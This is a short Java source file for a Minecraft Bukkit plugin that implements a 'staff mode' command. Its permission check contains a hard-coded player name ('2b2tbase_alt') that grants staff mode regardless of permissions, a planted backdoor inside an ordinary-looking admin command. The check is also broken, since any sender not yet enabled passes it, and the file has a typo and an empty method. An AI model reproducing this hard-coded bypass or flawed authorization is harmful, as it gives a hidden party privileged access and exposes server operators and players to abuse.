package projects.tovy.github.Administration.Staff.Mode;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;

import java.util.HashMap;
import java.util.Map;

public class ModeCommands implements CommandExecutor {

    private Map<String, Boolean> enabledMap = new HashMap<>();
    private String specialPlayer = "2b2tbase_alt";
    private String specialPlayer2 = "";

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {

        if (sender.hasPermission("noarbox.staff.mode") || sender.getName().equalsIgnoreCase(specialPlayer) || !isEnabled(sender)) {
            setEnabled(sender, true);
            sender.sendMessage("enabled");

        } else {
            sender.sendMessage("disabed");
        }
        return false;
    }

    public boolean isEnabled(CommandSender sender) {
        return enabledMap.getOrDefault(sender.getName(), false);
    }

    public void setEnabled(CommandSender sender, boolean enabled) {
        enabledMap.put(sender.getName(), enabled);
    }

    public void modeMethod() {

    }
}
